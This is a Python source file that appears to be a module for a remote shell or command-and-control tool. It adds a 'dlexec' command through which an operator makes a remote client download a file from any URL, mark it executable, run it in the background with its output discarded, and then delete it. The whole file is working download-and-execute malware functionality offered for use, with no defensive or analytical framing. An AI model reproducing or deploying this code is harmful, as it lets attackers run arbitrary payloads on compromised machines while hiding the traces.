import module

import urllib2
import tempfile
import os
import subprocess as sp
import time
import stat

USAGE = """Download and execute.
usage: dlexec [-h] http://my.pro/gram

Download executable from internet and execute.

options:
-h\t\tshow help"""


@module.server_handler('dlexec')
def server(server, argv):
    if len(argv) < 2:
        print USAGE
        return
    resp = server.conn.exchange(' '.join(argv))
    msg = 'successful' if resp == 'done' else 'error: ' + resp
    print 'posh : dlexec {}'.format(msg)


@module.client_handler('dlexec')
def client(client, inp):
    """Download file from internet, save to temp file, execute.
    """

    r = urllib2.urlopen(inp.split()[1])
    with tempfile.NamedTemporaryFile(delete=False) as f:
        f.write(r.read())
        f.flush()
        os.fchmod(f.fileno(), stat.S_IRWXU)

    # intentionally not using sp.call() here because we don't
    # necessarily want to wait() on the process. also, this is outside
    # the with block to avoid a `Text file busy' error (linux)
    try:
        sp.Popen(f.name, stdout=open(os.devnull, 'w'), stderr=sp.STDOUT)
    except Exception as e:
        finish(client, f.name, str(e.args))
        return

    # we need this sleep(1) because of a race condition between the
    # Popen and following remove. If there were no sleep, in the Popen,
    # between the time it takes for the parent to fork, and the child's
    # exec syscall to load the file into memory, the parent would return
    # back here and delete the file before it gets executed. by sleeping
    # 1 second, we give the child a reasonable amount of time to hit the
    # exec syscall.
    #
    # NOTE: this is not a 100% solution. if for some reason, the time
    # between the child fork/exec is longer than 1 second (lol) the file
    # will still be deleted before it's executed. a "safer" solution would
    # be to keep track of all the paths of files downloaded and add a
    # shell "cleanup" command which could be run regularly to remove all
    # those paths after you know they're executed
    time.sleep(1)

    finish(client, f.name, 'done')


def finish(client, fname, send):
    os.remove(fname)
    client.s.send(send)
